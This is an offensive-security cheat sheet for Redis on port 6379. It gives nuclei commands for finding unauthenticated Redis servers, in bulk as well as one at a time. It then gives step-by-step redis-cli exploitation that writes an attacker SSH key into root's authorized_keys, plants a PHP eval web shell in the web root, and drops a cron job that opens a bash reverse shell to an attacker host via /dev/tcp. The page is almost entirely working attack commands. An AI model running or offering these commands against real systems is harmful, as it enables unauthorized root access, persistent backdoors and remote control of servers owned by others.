# 6379 - Redis

## Potential Risks

### Unauthorized Access

```bash
# https://github.com/yuukisec/iPoCs
# RHOST=remoteHost; RPORT=6379
nuclei -t ~/ipocs -id redis-unauth -u $RHOST:$RPORT

# Bulk testing
# RHOST_LIST=hosts.txt
nuclei -t ~/ipocs -id redis-unauth -l $RHOST_LIST -c 100 -bs 100
```

## Exploitation

### Write File

```bash
# Method 1: Write SSH public key
# RHOST=remoteHost; RPORT=
# Step 1: Generates an SSH key pair
if [ -f /tmp/.ssh_key ]; then; rm /tmp/.ssh_key /tmp/.ssh_key.pub; fi
ssh-keygen -t rsa -b 2048 -N "" -f /tmp/.ssh_key
(echo -e "\n\n"; awk '{print $1,$2;}' /tmp/.ssh_key.pub; echo -e "\n\n") > /tmp/.ssh_key_redis.pub
# Step 2: Upload SSH public key
cat /tmp/.ssh_key_redis.pub | redis-cli -h $RHOST -p $RPORT -x set santa
redis-cli -h $RHOST -p $RPORT
> CONFIG SET DIR /root/.ssh/ # The alternative is `CONFIG SET DIR /etc/ssh/`
> CONFIG SET DBFILENAME "authorized_keys"
> SAVE
# Step 3: Connect SSH using the private key
ssh -i /tmp/.ssh_key root@localhost

# Method 2: Write WebShell
redis-cli -h $RHOST -p $RPORT
> CONFIG SET DIR /var/www/html
> CONFIG SET DBFILENAME santa.php
> SET santa "\n\n\n\n<?php @eval($_REQUEST['santa']);?>\n\n\n\n"
> SAVE

# Method 3: Write Linux crontab
redis-cli -h $RHOST -p $RPORT
> CONFIG SET DIR /etc/cron.d
> CONFIG SET DBFILENAME santa_revs
> SET santa "\n\n\n\n* * * * * root bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1\n\n\n\n"
> SAVE
```

For more information, please refer to page [OOB > Reverse Shell > crontab (unix-only)](../../others-high/oob-payload.md#reverse-shell).

### GUI Tools

* [Another Redis Desktop Manager](https://goanother.com/cn/)
* [https://github.com/SafeGroceryStore/MDUT](https://github.com/SafeGroceryStore/MDUT)

